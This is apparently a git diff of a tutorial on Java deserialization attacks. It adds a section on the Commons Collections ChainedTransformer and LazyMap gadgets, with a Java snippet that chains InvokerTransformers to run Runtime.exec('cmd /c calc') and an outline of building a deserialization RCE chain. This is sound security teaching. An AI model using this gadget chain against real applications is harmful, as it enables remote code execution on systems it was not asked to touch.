@@ -12,11 +12,11 @@ In many programming languages, the ones we are more interested in, serialization
 
 These languages are:
 
-* PHP
 * Java
 * .NET
-* NodeJS
+* PHP
 * Python
+* NodeJS
 * Ruby
 
 The result of the serialization process is the so called "archive", or archive medium.
@@ -146,7 +146,7 @@ $ hexdump.exe -C de.ser
 The starting bytes, `ac ed 00 05` are a known signature for JAVA serialized objects. Prior to step further on, we should notice that the `Deserialize` function, calls one of the potentially exploitable function of JAVA, `readObject()`. This function, indeed, constitutes one of the POP gadgets of JAVA. During the deserialization via `readObject()`, the serialized-object properties are accessed recursively, untill every properties have been read. This process occurs due to the nature of serialization (As an exact clone of the original object is the result of this process, each and every property must be read and re-instantiated). 
 
 How can we exploit it? Basically, the trick is to pass an arbitrary nested object to the `readObject()` function, forcing the application to instantiate a chain of POP gadgets, leading to RCE. The POP gadgets that can be used may vary depending on the application `CLASSPATH` (as any gadget function must be on the classpath in order to be instantiated [Visibility Constraint]). 
-The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. The main pattern used to create chains is to use the DynamicProxy pattern, which more details can be found [here](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html).
+The ROP chain uses an opaque class order in order to chain subsequent classes using reflection, which allows to dynamically load classes and methods even without prior knowledge of these classes and methods. A common pattern used to create chains is the DynamicProxy pattern, which more details can be found [here](https://docs.oracle.com/javase/8/docs/technotes/guides/reflection/proxy.html).
 
 Following, a very basic example of DynamicProxy implementation:
 
@@ -177,6 +177,104 @@ public class DynamicProxy implements InvocationHandler {
 ```
 
 The above, would produce as output "toString". It should be noted that the use of `map`, is arbitrary, whatever object class could be used on its place. The idea of using this approach is that we can bind arbitrary code to execute whenever a specific method is invoked.
+
+Another useful pattern (technically more a class than a pattern), which is crucial to understand how we can trigger remote code execution during deserialization, is the `ChainedTransformer` class.
+
+A transformer, in JAVA, is a class which takes an object and returns a new object instance. A chained transformer, for instance, can chain multiple transformer togheter to transform an object multiple times, in sequence. To understand how this can be used to reach RCE, we can take the following example:
+
+```java
+import java.io.IOException;
+import java.lang.reflect.InvocationTargetException;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+
+public class ExeCmdInvokerTransformer {
+    
+    public static void main(String args[]) throws NoSuchMethodException, SecurityException, IllegalAccessException, IllegalArgumentException, InvocationTargetException, IOException {
+        
+        final String[] execArgs = new String[]{"cmd /c calc"};
+        
+        // Chain to transform object in -> ((Runtime)Runtime.class.getMethod("getRuntime").invoke(Object.class, null)).exec("cmd /c calc");
+        Transformer[] transformers = new Transformer[]{
+            new ConstantTransformer(Runtime.class),
+            new InvokerTransformer("getMethod",
+                new Class[]{String.class, Class[].class},
+                new Object[]{"getRuntime", new Class[0]}),
+            new InvokerTransformer("invoke",
+                new Class[]{Object.class, Object[].class},
+                new Object[]{null, new Object[0]}),
+            new InvokerTransformer("exec",
+                new Class[]{String.class}, 
+                execArgs
+                 ),
+            new ConstantTransformer(1)};
+        
+        Transformer transformerChain = new ChainedTransformer(transformers);
+        
+        // Testing the transformer
+        Object object = new Object();
+        transformerChain.transform(object);
+    }
+}
+```
+
+Above, the chain transformer takes an arbitrary object, ignores it, calls runtime `exec`, and executes an arbitrary command (in this case `cmd /c calc`).
+
+The last pattern we'll see to understand how to reach RCE via deserialization works, is the "key creation via LazyMap key search miss". A LazyMap, in JAVA, is a decorator (function that can be applied to a Map) that gets execute whenever a key is requested in a Map. The terms "lazy" , refers to the fact that the (key, value) is not stored in the HashMap from the start, but it gets populated once the first call to the map forced the transformer to execute and fetch the value for the key. To understand how the proces works, we can see the following example:
+
+```java
+import java.util.*;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.map.LazyMap;
+
+public class HowLazyMap {
+    
+    public static void main(String args[]) {
+    // Create a Transformer to get random areas
+        Transformer randomArea = new Transformer( ) {
+            public Object transform( Object object ) {
+                String name = (String) object;
+                Random random = new Random();
+                return random.nextDouble();
+            }
+        };
+
+        // Create a LazyMap called desertAreasLazy, which uses the above Transformer
+        Map deserts = new HashMap( );
+        Map desertAreasLazy = LazyMap.decorate( deserts, randomArea );
+        
+        // Set name to fetch
+        String desertName = "Gobi";
+        
+        System.out.println(String.format("Deserts contains %s? Result: %s", desertName, deserts.get(desertName)));  
+        
+        // Get name, print area
+        String area = (String) String.valueOf(desertAreasLazy.get( desertName ));
+        System.out.println( "Area: " + area );
+
+        System.out.println(String.format("Deserts now contains %s? Result: %s", desertName, deserts.get(desertName)));
+    }
+}
+```
+
+The result would be something like:
+
+```
+Deserts contains Gobi? Result: null
+Area: 0.8610944732469801
+Deserts now contains Gobi? Result: 0.8610944732469801
+```
+
+Showing that the LazyMap populates the HashMap with a "lazy" approach.
+
+How can this be exploited during the deserialization process? Easy.
+
+We can create a LazyMap, set a Dynamic Proxy to hook a key creation, and execute a chained transformer on the hook. Does that seems fair? 
+
+#### Ysoserial
 
 During the years, a set of common libraries were identified that can be used to build POP chains. These libraries are known as **gadget libraries**.
 
